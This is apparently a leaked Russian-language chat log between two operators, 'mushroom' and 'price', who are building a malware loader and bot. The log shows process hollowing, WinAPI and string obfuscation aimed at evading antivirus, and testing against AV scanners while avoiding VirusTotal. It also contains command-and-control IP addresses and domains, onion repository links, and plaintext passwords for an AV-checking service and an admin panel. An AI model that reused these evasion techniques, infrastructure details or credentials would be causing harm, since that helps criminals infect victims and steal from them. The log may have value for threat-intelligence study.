2020-10-21 11:02:38.044108	price	mushroom	в смысле из проводника?
2020-10-21 11:03:03.082524	mushroom	price	Да. Лоадер это файл, который запускает пользователь двойным кликом.
2020-10-21 11:03:21.612765	price	mushroom	не наше дело как его к этомму принудят?
2020-10-21 11:03:26.864887	mushroom	price	Да.
2020-10-21 11:04:06.958912	mushroom	price	Какие адреса я давал тебе тестовые?
2020-10-21 11:04:16.120704	mushroom	price	Я их у себя не сохранил.
2020-10-21 11:04:18.835632	price	mushroom	5.181.156.226
2020-10-21 11:04:19.120346	mushroom	price	Напиши.
2020-10-21 11:04:24.673312	price	mushroom	лоадер
2020-10-21 11:04:34.186745	price	mushroom	[14:10:26] <mushroom> Вот адреса для тестирования:
бот

194.5.249.46

лоадер

5.181.156.226
2020-10-21 11:04:39.234210	mushroom	price	OK.
2020-10-21 11:04:42.059362	price	mushroom	лоадер работает
2020-10-22 07:47:43.268773	mushroom	price	Привет. Доделал?
2020-10-22 07:48:26.565901	price	mushroom	нет связи с сервером бота, может обновились
2020-10-22 07:48:57.015992	price	mushroom	а так перешел на подсистему виндоуз, всё что надо удаляю, стартую холовинг процесс но - связи нет
2020-10-22 07:50:20.925171	mushroom	price	На GitLab загрузил?
2020-10-22 07:50:40.176830	price	mushroom	нет пока не отладил же
2020-10-22 07:50:58.908067	price	mushroom	есть адреса сервера ботов?
2020-10-22 07:51:20.953839	mushroom	price	А бот?
2020-10-22 07:51:33.576694	mushroom	price	Бот ты сделал.
2020-10-22 07:51:52.439208	price	mushroom	вот бот сейчас и запускаю и нет валидации серверов
2020-10-22 07:52:10.715680	price	mushroom	бот давно всё отладил, но сейчас нет связи
2020-10-22 07:52:12.920922	mushroom	price	Подписи нету?
2020-10-22 07:52:19.246275	price	mushroom	да
2020-10-22 07:52:26.621942	mushroom	price	Отключи тогда пока её проверку.
2020-10-22 07:52:40.482266	price	mushroom	сейчас попробую
2020-10-22 07:53:27.666536	mushroom	price	Загружай на GitLab. Чтобы собрать версию Release с логами.
2020-10-22 07:53:50.132325	price	mushroom	хорошо
2020-10-22 07:54:28.651548	mushroom	price	Что осталось сделать?
2020-10-22 07:54:37.226789	mushroom	price	Загрузчик протестировать?
2020-10-22 07:55:02.981244	price	mushroom	1. восстановить работу бота (не пускает верифицация)
2020-10-22 07:55:14.860567	price	mushroom	2. загрузить бот в админку
2020-10-22 07:55:33.689601	price	mushroom	3. проверить как лоадер загружает бот холовингом
2020-10-22 07:57:04.648351	mushroom	price	А у меня есть подпись.
2020-10-22 07:57:31.773479	price	mushroom	вот и странно, этот адрес 194.5.249.46?
2020-10-22 07:59:47.180268	mushroom	price	Этот адрес не работает вообще.
2020-10-22 08:00:15.797240	price	mushroom	какой работает у тебя?
2020-10-22 08:00:26.631994	price	mushroom	 [14:10:26] <mushroom> Вот адреса для тестирования:
бот

194.5.249.46

лоадер

5.181.156.226
2020-10-22 08:00:56.507266	mushroom	price	194.5.249.46 перестал работать.
2020-10-22 08:01:15.211975	price	mushroom	[10:57:02] <mushroom> А у меня есть подпись.
2020-10-22 08:01:22.572820	price	mushroom	по какому адресу?
2020-10-22 08:02:35.580899	mushroom	price	Новый дам тогда, сейчас сделают наверное. Пока на GitLab проект бота обнови, чтобы я собрать смог Release с логами.
2020-10-22 08:02:54.247361	price	mushroom	сейчас загружу
2020-10-22 08:31:55.289657	mushroom	price	45.89.125.130
2020-10-22 08:36:49.887656	price	mushroom	спасибо
2020-10-22 08:36:59.844132	price	mushroom	сейчас попробую
2020-10-22 08:38:05.923368	price	mushroom	а вот скажи
2020-10-22 08:38:41.858644	price	mushroom	у меня бот начал работать и попал в хонипоты, я сделал ему пометку бот и он перешел уже в боты-это как работает и почему?
2020-10-22 08:39:54.357865	mushroom	price	Может по адресу, в СНГ они не должны работать.
2020-10-22 08:40:05.999795	mushroom	price	Ты сделай пометку лучше что это тестовый бот.
2020-10-22 08:40:22.087311	price	mushroom	спасибо, надо впн поставить
2020-10-22 08:40:28.636384	price	mushroom	а как делать пометку?
2020-10-22 08:40:55.145059	mushroom	price	я сделал ему пометку бот и он перешел уже в боты
2020-10-22 08:40:59.461807	mushroom	price	Так же.
2020-10-22 08:41:07.829086	mushroom	price	Справа кнопка.
2020-10-22 08:41:12.583796	price	mushroom	я как спросил тоже догадался
2020-10-22 08:41:57.244987	price	mushroom	теперь я знаю всё
2020-10-22 08:42:36.445230	price	mushroom	у меня вроде заработало всё
2020-10-22 08:43:08.129074	price	mushroom	и верификация есть и холовинг в ноутпэд и отстук в админке!
2020-10-22 08:43:46.380493	mushroom	price	Все команды проверь.
2020-10-22 08:44:21.230379	price	mushroom	да, там чистить всё надо (не от АВ, а потом и от АВ)
2020-10-22 08:44:26.289512	price	mushroom	хорошо
2020-10-22 08:44:52.438071	price	mushroom	я бота в гитлабе обновил, а лоадера сейчас загружу
2020-10-22 08:45:06.574663	price	mushroom	поскольку он так функциональный стал
2020-10-22 10:00:10.608229	price	mushroom	https://n4iaacb37wmqclht.onion/price/WCRT.git     -   библиотека для сборки без CRT
2020-10-22 10:00:14.456529	price	mushroom	https://n4iaacb37wmqclht.onion/price/ld6.git
2020-10-22 10:00:36.222313	price	mushroom	https://n4iaacb37wmqclht.onion/price/bd6.git
2020-10-22 10:00:48.941472	price	mushroom	сейчас доступ открою
2020-10-22 10:02:22.080879	price	mushroom	открыл
2020-10-22 10:02:49.442132	price	mushroom	ld6 ссылается на проект wcrt
2020-10-22 10:03:34.859818	price	mushroom	bd6 внутри себя содержит этот проект, но я буду переделывать на единый отдельный проект как для ld6
2020-10-22 13:32:04.082617	mushroom	price	Не собирается bd6.
2020-10-22 13:32:25.408076	mushroom	price	Скачай из GitLab в чистом виде bd6 проект и собери.
2020-10-22 13:32:26.070257	price	mushroom	что пишет?
2020-10-22 13:32:36.223934	price	mushroom	ок
2020-10-22 13:32:48.300347	price	mushroom	сейчас в виртуалке соберу
2020-10-22 13:32:54.193325	mushroom	price	Куча не объявленных идентификаторов.
2020-10-22 13:33:18.777723	mushroom	price	командная строка warning D9025: переопределение "/sdl-" на "/GS-"
2020-10-22 13:33:47.311946	mushroom	price	На это обращал внимание?
2020-10-22 13:33:49.509279	price	mushroom	это только предупреждение, в свойствах проекта много чего определено
2020-10-22 13:34:06.051971	mushroom	price	Это получается что не отключены проверки.
2020-10-22 13:34:08.838383	price	mushroom	я разберу и устраню лишнее
2020-10-22 13:34:31.207315	price	mushroom	проверки старался все отключить
2020-10-22 13:34:45.644056	mushroom	price	Ты их в одном месте отключил, а в другом месте  опять включил.
2020-10-22 13:34:49.408269	price	mushroom	сейчас соберу и буду смотреть
2020-10-22 13:35:10.861596	mushroom	price	Чистую попробуй собрать.
2020-10-22 13:35:28.873961	price	mushroom	так в ВМ же, там этого ничего не было
2020-10-22 13:35:46.656266	mushroom	price	Прямо скачал, открыл, выбрал Release x64 нажал запустить.
2020-10-22 13:35:54.895134	price	mushroom	дада
2020-10-22 13:35:57.803286	mushroom	price	Чтобы всё собралось и запустилось.
2020-10-22 13:36:16.672317	mushroom	price	И так же dl6.
2020-10-22 13:39:02.175084	mushroom	price	омандная строка warning D9025: переопределение "/sdl-" на "/GS-"
2020-10-22 13:39:18.322248	mushroom	price	Сотри в настройках /sdl-
2020-10-22 13:39:26.387107	price	mushroom	ок
2020-10-22 13:39:28.795391	mushroom	price	Пуста строка просто в этом поле.
2020-10-22 13:40:27.326213	price	mushroom	т.е. не No (/sdl-)
2020-10-22 13:40:45.897159	mushroom	price	Да.
2020-10-22 13:41:21.853389	price	mushroom	command line warning D9025: overriding '/sdl-' with '/GS-'
2020-10-22 13:41:29.572100	price	mushroom	вот так пишет
2020-10-22 13:41:54.426128	mushroom	price	Уверен что стёр?
2020-10-22 13:42:02.948906	price	mushroom	но это значит что перебивается опция  '/sdl-' на '/GS-'
2020-10-22 13:42:06.443479	price	mushroom	уверен
2020-10-22 13:42:08.343152	mushroom	price	Може не в той сборке стёр.
2020-10-22 13:42:12.231101	price	mushroom	нажал применить
2020-10-22 13:42:20.526085	price	mushroom	для всех конфигураций
2020-10-22 13:42:33.108877	mushroom	price	Я в твоём bd6 стёр у меня не пишет ничего.
2020-10-22 13:43:00.986183	mushroom	price	Ладно. Это не критично. Сделай чтобы собралось.
2020-10-22 13:43:33.933335	price	mushroom	так может у тебя Disable Security Check (/GS-) нет?
2020-10-22 13:43:48.463422	price	mushroom	хоття ты в моем проекте собираешь
2020-10-22 13:44:03.320669	mushroom	price	Есть. Я же твой bd6 собираю.
2020-10-22 13:44:15.915057	mushroom	price	Все твои настройки. GS- там есть.
2020-10-22 13:44:19.021098	price	mushroom	так я это и признал, что одно и то же запускаем
2020-10-22 13:44:33.444765	mushroom	price	Я не могу собрать пока.
2020-10-22 13:44:44.092520	mushroom	price	Жду когда починишь.
2020-10-22 13:45:06.907945	price	mushroom	чиню
2020-10-22 13:55:00.061586	price	mushroom	убрал оверайды. это wcrt проект их давал
2020-10-22 13:55:17.265791	mushroom	price	Можно смотреть?
2020-10-22 13:55:23.943224	price	mushroom	тварь виртуалбокс стал оббновляться
2020-10-22 13:55:45.207326	price	mushroom	на гит я забросил, но пока не проверял ВМ тормозит
2020-10-22 13:57:45.654510	mushroom	price	Ты sdl убрал только?
2020-10-22 13:58:03.723692	mushroom	price	Я думал можно собирать уже.
2020-10-22 13:58:07.721774	price	mushroom	пока да. основная цель сборка тобой проекта.
2020-10-22 13:58:19.302546	price	mushroom	нет ВМ чтобы попробовать
2020-10-22 13:58:46.645029	price	mushroom	он в процессе пишет This may take several minutes (уже 10 прошло)
2020-10-22 13:59:04.897451	price	mushroom	ещё минуту подожду и сканселю
2020-10-22 13:59:10.781739	mushroom	price	Напишешь тогда.
2020-10-22 13:59:18.037765	price	mushroom	конечно
2020-10-23 09:31:45.040073	price	mushroom	привет. Всё залил на Гит. Создал виндоуз 2004 ВМ. Установил Студию. Скачал 3 проекта  с Гита. Собрал без ошибок с помощью Batch Build все конфигурации. Отстук из ВМ есть.
2020-10-23 09:45:52.574186	mushroom	price	привет. Всё залил на Гит. Создал виндоуз 2004 ВМ. Установил Студию. Скачал 3 проекта  с Гита. Собрал без ошибок с помощью Batch Build все конфигурации. Отстук из ВМ есть.
2020-10-23 12:50:54.777450	mushroom	price	Привет. Не могу посмотреть проекты твои, GitLab не работает.
2020-10-23 12:51:36.357280	mushroom	price	Вот тебе пример обфускации WInAPi:
Download: https://qaz.im/load/RAaKti/BAHiQa   
Delete: https://qaz.im/index.php?a=delete&q=323784015
Пароль: ERa{kNNS?*J#r|*T"
2020-10-23 12:51:36.989994	price	mushroom	ничего страшного я тут загадку решаю и лучше делаю.
2020-10-23 12:51:58.712206	mushroom	price	Смысл чтобы получать адрес функции на лету, по этому её не будет в импорте бинарника.
2020-10-23 12:52:05.505524	price	mushroom	У меня в дебаг x64 всё отлично отрабатывает
2020-10-23 12:52:21.578609	mushroom	price	Все функции WinApi обфусцируй, кроме всяких строковых lstrlen и т.д.
2020-10-23 12:52:43.247236	price	mushroom	а вотт в реллизе пропадает вызов функции WinMainCRTStartup
2020-10-23 12:52:46.769673	mushroom	price	Потом смотри импорт.
2020-10-23 12:52:56.177010	price	mushroom	посмотрю и сделаю
2020-10-23 12:53:06.815340	mushroom	price	WinMainCRTStartup это стандартная, она не подозрительна.
2020-10-23 12:53:42.666956	price	mushroom	я про то что она пропадает со всей ццепочкой вызовой и прога становится 4 кб сразу на завершение
2020-10-23 12:53:57.273136	price	mushroom	я сейчас это заплаткой пришью а так надо разбираться
2020-10-23 12:55:36.779913	mushroom	price	Обфускатор строк:
Download: https://qaz.im/load/Gi4yZZ/b6dSGf   
Delete: https://qaz.im/index.php?a=delete&q=868739743
Пароль: "MC>w#l!f@B!:pwYO
2020-10-23 12:55:45.836181	price	mushroom	у меня Гит работает
2020-10-23 12:55:53.289824	mushroom	price	Все строки в прогамме обфусцируй.
2020-10-23 12:56:06.515039	mushroom	price	Потом проверяй бинарник, чтобы их не было.
2020-10-23 12:56:25.960094	mushroom	price	_STR("str") ANSI, _WCS("str") UNICODE
2020-10-23 12:56:38.873805	price	mushroom	хорошо
2020-10-23 12:57:35.344715	mushroom	price	Когда используешь _WCS надо сначала в буффер промежуточный записывать, а потом уже использовать:
WCHAR[100] str;
lstrcpyW(str, _WCS(L"str"));
используешь str
2020-10-23 12:57:52.102918	mushroom	price	Для ANSI можно сразу использовать _STR("str")
2020-10-23 12:59:23.175171	mushroom	price	Ещё альтернативный обфускатор строк:
Download: https://qaz.im/load/TZRaZF/yhFskK   
Delete: https://qaz.im/index.php?a=delete&q=731386863
Пароль: u[y*`%3Y=H5P0S4<P
2020-10-23 12:59:31.033770	mushroom	price	Он с юникод не работает.
2020-10-23 12:59:48.420737	mushroom	price	Там так только _STR есть.
2020-10-23 13:00:11.884940	mushroom	price	Обфусцируй всё в боте и загрузчике.
2020-10-23 13:00:30.638041	price	mushroom	критично юникод использовать
2020-10-23 13:00:32.201835	price	mushroom	?
2020-10-23 13:00:43.553166	price	mushroom	или на мультибайтах можно остановиться
2020-10-23 13:00:45.437002	mushroom	price	Нет.
2020-10-23 13:00:57.463206	mushroom	price	Что хочешь используй.
2020-10-23 13:01:08.357177	price	mushroom	говорят вмультибайтах плохо в японии с путями работать
2020-10-23 13:01:22.670415	mushroom	price	В юникод программа больше просто по размеру.
2020-10-23 13:01:40.786232	price	mushroom	я к тому при использовании строго анси не встанет потом?
2020-10-23 13:01:51.355975	price	mushroom	в проблему
2020-10-23 13:02:12.044886	mushroom	price	А ты TEXT используй
2020-10-23 13:02:25.037246	mushroom	price	Тогда преключать сможешь легко.
2020-10-23 13:02:48.126625	price	mushroom	не так всё просто бывает переключиться
2020-10-23 13:02:51.254387	mushroom	price	_TSTR(TEXT("str")) автоматом так же обфусцирует анси и юникод.
2020-10-23 13:02:59.857980	price	mushroom	функции есть строго ансишные или наоборот
2020-10-23 13:03:35.212915	mushroom	price	Это какие?
2020-10-23 13:03:47.529537	mushroom	price	Вроде они все в двух видах.
2020-10-23 13:03:53.713600	price	mushroom	ну не знаю, видел вчера
2020-10-23 13:04:14.081125	price	mushroom	например CommandLineToArgvA
2020-10-23 13:04:19.189320	mushroom	price	Делай всё анси тогда.
2020-10-23 13:04:32.169522	price	mushroom	спасибо, прямо камень упал
2020-10-23 13:04:39.518641	mushroom	price	Будет размер меньше.
2020-10-23 13:05:13.243786	mushroom	price	CommandLineToArgvW
2020-10-23 13:05:13.752574	mushroom	price	Есть такая.
2020-10-23 13:05:14.818473	price	mushroom	но у меня реально чудо, пропал вход в функцию в программе
2020-10-23 13:06:41.874829	price	mushroom	на релизе
2020-10-23 13:06:41.940934	price	mushroom	в ld6
2020-10-23 13:07:04.897711	mushroom	price	Точку входа сам укажи.
2020-10-23 13:07:11.057782	mushroom	price	В настройках проекта.
2020-10-23 13:07:11.245284	price	mushroom	а у меня как раз всеё анси и не могу её использовать, но уже есть и ансишная
2020-10-23 13:07:34.817650	price	mushroom	это мысль хорошая, сейчас опробую
2020-10-23 13:07:38.980218	mushroom	price	У subsystem windows не mainCRTSTartup входная.
2020-10-23 13:07:51.628390	mushroom	price	winmainCRTSTartup
2020-10-23 13:07:55.113503	mushroom	price	как то так.
2020-10-23 13:07:56.794181	price	mushroom	вот для дебага как раз она
2020-10-23 13:08:15.950606	price	mushroom	ну да WinMainCRTStartup
2020-10-23 13:08:35.071096	price	mushroom	я сейчас её закреплю
2020-10-23 13:09:18.033416	price	mushroom	БЛИН!
2020-10-23 13:09:37.114412	price	mushroom	у меня как раз уже закреплено было в конфигурации ld6
2020-10-23 13:09:45.301936	price	mushroom	и надо стереть её!
2020-10-23 13:10:08.600309	price	mushroom	бинго
2020-10-23 13:11:02.715525	price	mushroom	Всё! Готов к обфускации!
2020-10-23 13:11:31.158016	price	mushroom	пошел отстук на релизе, есть логирование в файл и на консоль
2020-10-23 13:12:12.911159	price	mushroom	отключу конечно логирование для релиза, вставил для отладки релизной сборки
2020-10-23 13:12:34.053409	mushroom	price	Ещё. Сделай сборки Release_nologs, тоже самое что Release, но все строки обфусцированны и никакого вывода.
2020-10-23 13:12:50.874906	price	mushroom	да, конечно
2020-10-23 13:13:09.650941	mushroom	price	Должно быть так Debug, Release с выводом, Release_nologs как я написал выше.
2020-10-23 13:13:22.794660	mushroom	price	Release должен быть с выводом. Это для тестеров.
2020-10-23 13:13:54.027105	mushroom	price	Чтобы было вверху выбирать что собирать, ну ты понял.
2020-10-23 13:13:58.269859	price	mushroom	ты когда генеришь и меня проверяешь Бэтч билдом делаешь? он при Пуше передается на Гит?
2020-10-23 13:14:05.232461	mushroom	price	В Visual Studio.
2020-10-23 13:14:36.582407	price	mushroom	галочки в бэтч билде
2020-10-23 13:14:50.921738	mushroom	price	Где это бэтч билд?
2020-10-23 13:14:58.020240	mushroom	price	Не знаю такого.
2020-10-23 13:15:09.945048	price	mushroom	классная вещь
2020-10-23 13:15:24.280834	price	mushroom	заходишь в Build
2020-10-23 13:15:38.869951	price	mushroom	и в выпадающем окне Batch Build
2020-10-23 13:15:56.306184	price	mushroom	там указываешь все нужные конфиги и ждёщь судьбу сборки
2020-10-23 13:16:27.394772	price	mushroom	по русски не могу сказать как, может сборка?
2020-10-23 13:16:31.978587	mushroom	price	А по русски это как называется?
2020-10-23 13:16:48.901833	price	mushroom	5 позиция верхнего меню студии
2020-10-23 13:16:56.376829	price	mushroom	после проекта
2020-10-23 13:17:01.093558	mushroom	price	Пакетна сборка.
2020-10-23 13:17:05.571056	price	mushroom	да
2020-10-23 13:17:10.823861	price	mushroom	зайди тебе понравится
2020-10-23 13:17:18.036209	mushroom	price	Проще указать зависимости, проектов.
2020-10-23 13:17:39.907115	mushroom	price	Ты сделал, чтобы я выбрал bd6 собрать и всё что нужно собралось?
2020-10-23 13:17:40.561980	price	mushroom	а когда все надо конфиги поддготовить или проверить
2020-10-23 13:18:12.621382	price	mushroom	я с утра сделал, проверил на ВМ и при посылке /скачивании с ГИТА
2020-10-23 13:18:38.055542	price	mushroom	сейчас ещё проверю поскольку изменения были
2020-10-23 13:18:49.968748	mushroom	price	Хорошо. Когда заработает GitLab посмотрю. Пока обфусцируй всё в Release_nologs.
2020-10-23 13:19:23.601155	price	mushroom	это только в этой сборке надо делать, а в остальных избегать?
2020-10-23 13:19:33.131063	mushroom	price	Да.
2020-10-23 13:19:36.486722	price	mushroom	ок
2020-10-23 13:19:58.159223	mushroom	price	Строки макросом OBFUSCATED_STRINGS включаются.
2020-10-23 13:20:24.070684	mushroom	price	Так что легко в сборках делать обфускацию где надо.
2020-10-23 13:21:00.639734	price	mushroom	а надо где АВ срабатывает?
2020-10-23 13:21:16.416804	mushroom	price	Release_nologs
2020-10-23 13:21:24.056869	mushroom	price	Только там.
2020-10-23 13:21:31.705241	mushroom	price	Все строки статические.
2020-10-23 14:08:16.911796	mushroom	price	Запустил bd6. Тишина. Адреса рабочие там?
2020-10-23 14:08:35.933846	price	mushroom	я работаю
2020-10-23 14:08:42.213638	mushroom	price	В консоль ничего не пишется.
2020-10-23 14:08:49.203807	price	mushroom	сделай c:\log6
2020-10-23 14:08:58.737196	mushroom	price	А в консоль?
2020-10-23 14:08:59.130218	price	mushroom	и там будет выдача
2020-10-23 14:09:18.385221	price	mushroom	в консоль дебаг запускай
2020-10-23 14:09:23.983861	price	mushroom	пока так
2020-10-23 14:09:38.066361	price	mushroom	сейчас с этим работаю, юзерфрендли
2020-10-23 14:13:30.342741	price	mushroom	сейчас из ВМ запустил есть отклик. Релизный конфиг и там есть и консоль и в файл.
2020-10-23 14:13:46.460034	price	mushroom	Может ещё скачать ld6 из гита?
2020-10-23 14:14:08.118135	mushroom	price	Already up to date.
2020-10-23 14:14:33.562650	price	mushroom	сейчас поправлю новыми изменениями
2020-10-23 14:39:16.059668	price	mushroom	не пушает
2020-10-23 14:39:37.980161	price	mushroom	Can't complete SOCKS5 connection to n4iaacb37wmqclht.onion:443.
2020-10-23 14:40:16.646688	mushroom	price	У меня тоже.
2020-10-23 14:40:24.826347	mushroom	price	Постоянно так работает.
2020-10-23 14:40:31.601478	mushroom	price	Через раз.
2020-10-23 14:41:15.975140	price	mushroom	я два раза пушнул и нифига
2020-10-23 15:32:13.340663	price	mushroom	извини не по теме. Ты не знаешь как в студии в питоне считать input() с кллавиатуры?
2020-10-23 15:32:44.634707	mushroom	price	Не знаю. С питон не работал.
2020-10-23 15:33:18.147111	price	mushroom	у меня ребёнок бьётся у него eof исключение постоянно вылетает
2020-10-23 15:35:41.093767	mushroom	price	Пишут что так value = input("введите что нибудь")
    Python user input from the keyboard can be read using the input() built-in function.
    The input from the user is read as a string and can be assigned to a variable.
    After entering the value from the keyboard, we have to press the “Enter” button. Then the input() function reads the value entered by the user.
    The program halts indefinitely for the user input. There is no option to provide timeout value.
    If we enter EOF (*nix: Ctrl-D, Windows: Ctrl-Z+Return), EOFError is raised and the program is terminated.
2020-10-23 15:36:41.243411	price	mushroom	как только до оператора ввода доходит, тут же виснет в исключение
2020-10-23 15:37:15.321951	price	mushroom	ничего руками не ввожу, только клавишей на зеленый треугольник -выполнить
2020-10-23 15:38:00.705963	price	mushroom	плюнь не важно, это я на шару спросил, а не гррузить ерундой
2020-10-23 15:38:23.807530	mushroom	price	А я в командной строке питон всё ввёл и прочитал.
2020-10-23 15:38:41.021331	price	mushroom	вот вот
2020-10-23 15:38:51.994921	price	mushroom	а в ИДЕ?
2020-10-23 15:39:05.305187	price	mushroom	но мысль понравилась
2020-10-23 15:39:21.561524	mushroom	price	Значит в IDE проблема.
2020-10-23 15:39:59.749800	price	mushroom	как питон запустить?
2020-10-23 15:40:08.138833	price	mushroom	в терминале
2020-10-23 15:40:16.581955	mushroom	price	python.exe в командной строке
2020-10-23 15:40:23.693331	mushroom	price	Надо чтобы он был в path
2020-10-23 15:40:35.989402	price	mushroom	понятно
2020-10-23 15:40:44.354958	price	mushroom	у меня нет
2020-10-23 15:40:46.686445	mushroom	price	И там можно написать value = input("Hello\n")
2020-10-23 15:40:54.010019	mushroom	price	Ввести World
2020-10-23 15:41:23.541859	mushroom	price	Написать value, получишь World, то что ввёл.
2020-10-23 15:41:35.723904	price	mushroom	спасибо
2020-10-27 08:27:23.629590	mushroom	price	Привет можешь ждать пока, если всё доделал и обфусцировал.
2020-10-27 08:27:44.695564	mushroom	price	Пока на новом сервере учётку не сделали.
2020-10-27 08:28:38.938254	price	mushroom	ok
2020-10-27 08:29:31.257698	price	mushroom	а прокладки есть рабочие
2020-10-27 08:29:38.565103	price	mushroom	?
2020-10-27 08:30:19.163063	mushroom	price	Нету.
2020-10-27 08:30:36.065607	price	mushroom	будем ждать
2020-11-02 14:20:24.869678	mushroom	price	Привет. У тебя есть резервная учётная запись для связи? Если нету, создай и передай её Defender.
2020-11-02 14:21:13.566316	price	mushroom	я передал
2020-11-03 08:51:19.585746	mushroom	price	Привет.
2020-11-03 08:51:21.832677	mushroom	price	dyncheck.com
benalen@exploit.im
DH*&HKDbs*&TGLksg87whnw40utji$
2020-11-03 08:51:46.703364	price	mushroom	привет
2020-11-03 08:51:58.195726	price	mushroom	спасибо, а гит с серверами заработали?
2020-11-03 08:52:16.975384	mushroom	price	Проверь там свои обфусцированные программы статически и динамически. Если надо почисти.
2020-11-03 08:52:28.369133	price	mushroom	ок
2020-11-03 08:52:34.481320	mushroom	price	Нет.
2020-11-03 08:53:14.089574	mushroom	price	Когда будешь проверять статически windows defender cloud не включай, он там и не включен по умолчанию.
2020-11-03 08:53:56.087576	mushroom	price	Когда будешь проверять динамически internet connection не включай, по умолчанию он там block.
2020-11-03 08:57:35.212636	price	mushroom	комодо написал первый Dynamic detect
2020-11-03 08:57:45.633243	price	mushroom	остальные в процессе
2020-11-03 08:58:48.040755	mushroom	price	Жди пока все не закончатся. Комодо там на всё подряд пишет.
2020-11-03 08:59:19.533971	price	mushroom	ок
2020-11-03 09:06:14.632056	price	mushroom	runtime AV check кроме комодо -все клин
2020-11-03 09:06:56.516861	mushroom	price	И у загрузчика и у бота?
2020-11-03 09:07:11.242078	price	mushroom	только лоадер
2020-11-03 09:07:34.431336	price	mushroom	в бот пока не поставил обфускацию
2020-11-03 09:07:39.818381	price	mushroom	сегодня поставлю
2020-11-03 09:07:53.544195	mushroom	price	Статически тоже проверь всё.
2020-11-03 09:08:02.110972	price	mushroom	статический чек тоже 0/31
2020-11-03 09:08:24.421810	price	mushroom	да, и пока анхук не поставил
2020-11-03 09:08:29.675674	price	mushroom	сегодня посталю
2020-11-03 09:08:33.171169	price	mushroom	поставлю
2020-11-05 12:51:22.237789	mushroom	price	Привет.
https://ga72jrqnrjhsn6vi.onion:4247/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/index.php?r=site%2Findex
Логин: b2_1
Пароль: +gXjH[ovqDf8qq4}~E
Группа: prtest
2020-11-05 12:51:42.941039	mushroom	price	Заливай туда всё.
2020-11-05 12:51:51.561883	mushroom	price	ВСе компнды проверь.
2020-11-05 12:51:51.711304	price	mushroom	привет, во-время как раз надо
2020-11-05 12:52:06.477425	price	mushroom	хорошо
2020-11-05 12:53:24.750777	mushroom	price	Бот: https://zxeta.com:443,https://njhbbj.net:443
2020-11-05 12:54:02.972350	mushroom	price	Загрузчик: https://rdtvhbj.com:443,https://btyvkjbn.com:443,https://oihgb.com:443
2020-11-05 12:54:12.855445	price	mushroom	ок
2020-11-05 12:54:29.218292	mushroom	price	Только нигде там не свити адреса.
2020-11-05 12:54:53.625492	mushroom	price	Отправка образцов должныа быть выключена, когда тестируешь.
2020-11-05 12:54:55.844549	price	mushroom	а как светить?
2020-11-05 12:55:06.166296	mushroom	price	Отправка образцов.
2020-11-05 12:55:22.329218	price	mushroom	а она где?
2020-11-05 12:55:32.115948	price	mushroom	а при проверке в динчеке
2020-11-05 12:55:37.293579	mushroom	price	VirusTotal и ему подобные не используй.
2020-11-05 12:55:49.829033	price	mushroom	я в динчеке с выключенным облаком
2020-11-05 12:56:14.683482	mushroom	price	В dyncheck проверяй только когда всё будет работать без ошибок на 100 процентов.
2020-11-05 12:57:00.618835	mushroom	price	Статический dyncheck не сливает ничего, а динамический под вопросом, по этому Internet connection там в настройках Block.
2020-11-05 12:57:17.023353	price	mushroom	понял, я тогда статику в ВМ буду на авасте проверять
2020-11-05 12:57:45.174225	mushroom	price	Сначала проверь чтобы все команды без лшибок работали.
2020-11-05 12:57:46.858746	price	mushroom	и ЕСЕТе
2020-11-05 12:57:56.375937	price	mushroom	хорошо
2020-11-09 08:19:58.533225	mushroom	price	Привет. Ну что?
2020-11-09 08:24:04.839419	price	mushroom	пока работаю
2020-11-09 08:24:13.379731	price	mushroom	пытаюсь хуки поставить
2020-11-09 08:24:40.913325	price	mushroom	но не так это может и сложно, я организационно библиотеку прилаживаю
2020-11-09 08:25:06.141632	mushroom	price	Зачем хуки поставить?
2020-11-09 08:25:14.778598	mushroom	price	Такого в ТЗ нету.
2020-11-09 08:25:22.619000	price	mushroom	ну там в модуляхх было
2020-11-09 08:25:26.594689	price	mushroom	отт антивирусов
2020-11-09 08:25:37.346552	price	mushroom	я думал это надо
2020-11-09 08:26:05.395814	mushroom	price	На тестах не палится на dyncheck.
2020-11-09 08:26:08.823512	price	mushroom	тогда сегодня загружу в админку лоадера (он АВ тесты прошел)
2020-11-09 08:26:19.009978	mushroom	price	В работу надо отдавать.
2020-11-09 08:26:32.850797	mushroom	price	Проверил все команды?
2020-11-09 08:26:34.815484	price	mushroom	в смысле, если не палится то ценная штука?
2020-11-09 08:26:57.021369	price	mushroom	ещё попроверяю раз так (в работу)
2020-11-09 08:27:01.020546	mushroom	price	В смысле в работу можно отдать.
2020-11-09 08:27:27.046761	mushroom	price	Доработки папарельно делать будешь.
2020-11-09 08:27:38.030558	mushroom	price	Проверь все команды.
2020-11-09 08:27:47.643673	price	mushroom	хорошо
2020-11-09 08:30:27.690406	mushroom	price	Как провертшь бинарник загрузчика без логов, обфусцированный мне пришли.
2020-11-09 08:30:53.297963	mushroom	price	Если нужны адреса будут, пиши.
2020-11-09 08:30:54.609605	price	mushroom	сорсы?
2020-11-09 08:31:04.441738	mushroom	price	Бинарник.
2020-11-09 08:31:04.589756	price	mushroom	так сразу и нужны
2020-11-09 08:31:09.647300	price	mushroom	как проверять то
2020-11-09 08:31:17.102808	price	mushroom	пишу
2020-11-09 08:31:24.195587	mushroom	price	bot
3.86.163.159
3.91.47.199

loader
3.15.220.79
3.139.97.6
18.236.63.179
2020-11-09 08:31:28.743282	price	mushroom	спасибо
2020-11-10 07:58:14.512373	mushroom	price	Привет. Проверил?
2020-11-10 08:03:01.463863	price	mushroom	бота пока проверяю
2020-11-10 08:03:10.140777	price	mushroom	привет
2020-11-10 08:04:22.594625	price	mushroom	гит еще не подогнали?
2020-11-10 08:04:53.864963	mushroom	price	Нчинают делать. Мне сделали.
2020-11-10 08:05:25.428109	price	mushroom	я бота проверю скажу сразу же, немного осталось
2020-11-10 08:06:16.739858	mushroom	price	OK.
2020-11-10 11:20:05.063974	price	mushroom	чтото не коннектится к серверам лоадер
2020-11-10 11:20:12.173823	price	mushroom	есть прокладки новые?
2020-11-10 11:22:03.513245	mushroom	price	bot
54.202.82.138
52.37.88.45

loader
18.188.120.36
3.138.35.230
54.174.190.230
2020-11-10 11:22:23.653572	price	mushroom	спасибо
2020-11-11 08:52:45.250732	mushroom	price	Привет. Ну как?
2020-11-11 08:53:17.812652	price	mushroom	у меня криптер отвалился, ремонтирую
2020-11-11 08:53:45.774454	price	mushroom	почемуто на эксепшн вылетает, хотя всё вроде в параметрах нормально
2020-11-11 08:54:25.332638	mushroom	price	Какой криптер?
2020-11-11 08:54:35.828852	mushroom	price	Проверка подписи?
